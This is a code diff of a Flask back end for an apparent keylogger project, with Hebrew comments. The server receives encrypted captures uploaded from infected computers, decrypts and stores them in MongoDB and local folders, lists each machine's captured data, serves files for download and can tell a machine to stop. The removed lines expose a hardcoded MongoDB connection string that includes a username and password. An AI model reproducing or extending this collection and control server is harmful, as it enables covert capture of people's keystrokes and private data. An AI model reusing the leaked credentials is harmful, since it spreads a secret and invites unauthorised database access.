@@ -7,13 +7,14 @@ import os
 import time
 import json
 
+
 app = Flask(__name__)
 CORS(app)
 
 class Users:
 
-    def __init__(self):
-        self.CONNECTION_STRING = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
+    def __init__(self,mongo_link:str):
+        self.CONNECTION_STRING = mongo_link
         self.client = MongoClient(self.CONNECTION_STRING)
         self.DB = self.client["KeyLoggerProject"]
         self.collection = self.DB["UsersDatabase"]
@@ -26,13 +27,14 @@ class Users:
 
 class App:
 
-    def __init__(self):
-        self.CONNECTION_STRING = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
+    def __init__(self,mongo_link:str):
+        self.CONNECTION_STRING = mongo_link
         self.client = MongoClient(self.CONNECTION_STRING)
         self.DB = self.client["KeyLoggerProject"]
         self.collection = self.DB["computers"]
         self.computer_connection = {}
-        self.path = "..\\server\\backend\\data"
+        self.computer_to_stop = []
+        self.path = os.path.join("..","server","backend","data")
 
     def get_computers_list(self):
         #קבלת רשימה של כל המחשבים
@@ -59,6 +61,8 @@ class App:
         if self.collection.find_one({"mac_name" :data["mac_name"]}) is not None:
             self._update_computer_details(data)
             return
+
+        print("new computer added:" , data["mac_name"])
 
         data["data"] = [data["data"]]
         insert_id = self.collection.insert_one(data).inserted_id
@@ -87,7 +91,6 @@ class App:
             #החזרת תשובה האם הצליח או לא
             return True
         except Exception as e:
-            print(e)
             return False
 
 
@@ -101,27 +104,23 @@ def home():
 @app.route("/api/upload",methods=["POST"])
 def upload():
 
-    # קבלת הנתונים שהמחשב שלך
-    data = request.get_json()
+    try:
 
-    # ניהול שגיאות
-    if error_manager(data):
-        return jsonify({"message": data})
+        data = request.get_json() # קבלת הנתונים שהמחשב שלך
 
-    # יצירת אוביקט של הצפנה
-    decryptor = Encryptor()
+        if error_manager(data):  # ניהול שגיאות
+            return jsonify({"message": "error"})
 
-    # להחזיר את ההצפנה למתונים המקוריים
-    data = decryptor.xor(data)
+        data = decryptor.decrypt(data) # להחזיר את ההצפנה למתונים המקוריים
 
-    # הוספת המחשב לDB
-    manager.add_computer(data)
+        manager.add_computer(data)  # הוספת המחשב לDB
 
-    #הוספת הנתונים לזיכרון בתור json
-    print(manager.save_in_json(data))
+        manager.save_in_json(data) #הוספת הנתונים לזיכרון בתור json
 
-    # החזרת תשובה
-    return jsonify({"message": "continue"})
+        return jsonify({"message": "stop" if data["mac_name"] in manager.computer_to_stop else "continue"}) #כיבוי המחשב אם נשלחה בקשת כיבוי
+    except Exception as e:
+        print(e)
+        return jsonify({"message" : "error"})
 
 def error_manager(data:dict) -> bool:
     #אם לא התקבל ערך
@@ -143,13 +142,24 @@ def user_verification():
     if response:
         return redirect(url_for("computers"))
     else:
-        return render_template("/templates/home.html")
+        message = create_message(user_name,password)
+        return render_template("home.html",message=message)
+
+def create_message(user_name,password):
+    message = {}
+    if not user_name:
+        message["user_name"] = "Empty"
+    if not password:
+        message["password"] = "Empty"
+    if user_name and password:
+        message["password"] = "Wrong"
+    return message
 
 @app.route("/computers")
 def computers():
     return render_template("computers.html")
 
-@app.route("/computers/get_computers_list",methods=["get"])
+@app.route("/api/get_computers_list",methods=["get"])
 def get_computers_list():
     #קבלת רשימת המחשבים מהדאה בייס
     list_of_computer = manager.get_computers_list()
@@ -157,14 +167,14 @@ def get_computers_list():
     #החזרת המחשבים לפרונט
     return jsonify({"list_of_computer" : list_of_computer})
 
-@app.route("/computers/<computer>",methods=["GET"])
+@app.route("/api/computers/<computer>",methods=["GET"])
 def get_computer_details(computer):
     #קבלת הנתונים של המחשב מהמחלקה
     data = manager.get_computer_details(computer)
 
     #בדיקה שקיבל מידע
     if not data:
-        return "ERROR:not found",404
+        return render_template("computers.html",message={"404" : f"{computer} not found"})
 
     #עיבוד הנתונים לפני הצגה
     data["data"] = process.process_list_of_data(data["data"])
@@ -172,7 +182,11 @@ def get_computer_details(computer):
     #יצירת שם הנתיב של קבצי המחשב
     folder_path = os.path.join(manager.path,data["mac_name"].replace(":","_"))
     #יצירת רשימה של כל הקבצים
-    list_of_files = os.listdir(folder_path)
+    try: #אם יש קבצים קיימים
+        list_of_files = os.listdir(folder_path)
+    except: #אם אין החזר מערך ריק
+        list_of_files = []
+
     list_of_files = [data["mac_name"].replace(":","_") + "\\" + file for file in list_of_files]
 
     #יצירת מילון עם כל הרשימה
@@ -183,7 +197,7 @@ def get_computer_details(computer):
     return render_template("/computer_information.html",
                            computer=computer,computer_data = data,data_list=data_list)
 
-@app.route("/download/<folder>/<path:file_path>",methods=["GET"])
+@app.route("/api/download/<folder>/<path:file_path>",methods=["GET"])
 def download_file(folder,file_path):
     #יצירת נתיב לתיקיית הקובץ
     folder = os.path.join("..\\server\\backend\\data",folder)
@@ -191,10 +205,22 @@ def download_file(folder,file_path):
     #החזרת הקובץ הנדרש
     return send_from_directory(folder,file_path,as_attachment=True)
 
+@app.route("/computers/<computer_name>/stop")
+def stop(computer_name):
+    manager.computer_to_stop.append(computer_name)
+    return "success",200
+
 
 if __name__ == '__main__':
-    users = Users()
-    manager = App()
+    #קבלת הקישור לחיבור לmongoDB
+    with open("../config.json",'r') as file:
+        data = json.load(file)
+        mongo_link = data["mongo_link"]
+        key = data["key"]
+
+    users = Users(mongo_link)
+    manager = App(mongo_link)
+    decryptor = Encryptor(key)# יצירת אוביקט של הצפנה
     process = SpecialKeys()
     app.run(debug=True)
 
